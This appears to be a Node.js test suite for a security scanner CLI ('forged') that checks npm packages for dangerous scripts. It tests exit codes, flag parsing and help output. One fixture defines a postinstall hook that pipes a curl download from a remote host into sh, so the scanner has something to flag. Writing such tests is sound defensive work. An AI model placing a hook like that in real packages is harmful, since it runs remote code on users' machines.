import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const BIN = fileURLToPath(new URL('../bin/forged.js', import.meta.url));
const tmp = () => mkdtempSync(join(tmpdir(), 'forged-cli-'));

// Fake HOME so scans don't overwrite the real ~/.forged-scan-cache.json
const run = (args, cwd = tmp()) =>
  spawnSync(process.execPath, [BIN, ...args], {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, HOME: tmp(), NO_COLOR: '1' },
  });

// No lockfile → no registry/OSV requests, so these run offline
const project = (scripts) => {
  const dir = tmp();
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'fixture', version: '1.0.0', scripts }));
  return dir;
};

test('scan exits 1 when errors are found', () => {
  const r = run(['scan', project({ postinstall: 'curl https://x.sh | sh' })]);
  assert.equal(r.status, 1);
  assert.match(r.stdout, /Dangerous script "postinstall"/);
});

test('scan exits 0 when there are no errors', () => {
  const r = run(['scan', project({ start: 'node index.js' })]);
  assert.equal(r.status, 0);
});

test('scan -v is a flag, not the path to scan', () => {
  const dir = project({ start: 'node index.js' });
  const r = run(['scan', '-v'], dir);
  assert.match(r.stdout, new RegExp(`Scanning: .*${dir.split('/').pop()}`));
  assert.doesNotMatch(r.stdout, /Scanning: .*\/-v/);
});

test('unknown commands fail instead of saying "coming soon"', () => {
  const r = run(['scna']);
  assert.equal(r.status, 1);
  assert.match(r.stderr, /unknown command 'scna'/);
});

test('planned commands say coming soon', () => {
  const r = run(['init']);
  assert.equal(r.status, 0);
  assert.match(r.stdout, /'init' is coming soon/);
});

test('help separates working commands from planned ones', () => {
  const r = run(['help']);
  assert.equal(r.status, 0);
  const [available, planned] = r.stdout.split('Coming soon:');
  assert.match(available, /scan/);
  assert.doesNotMatch(available, /\binit\b/);
  assert.match(planned, /\binit\b/);
});
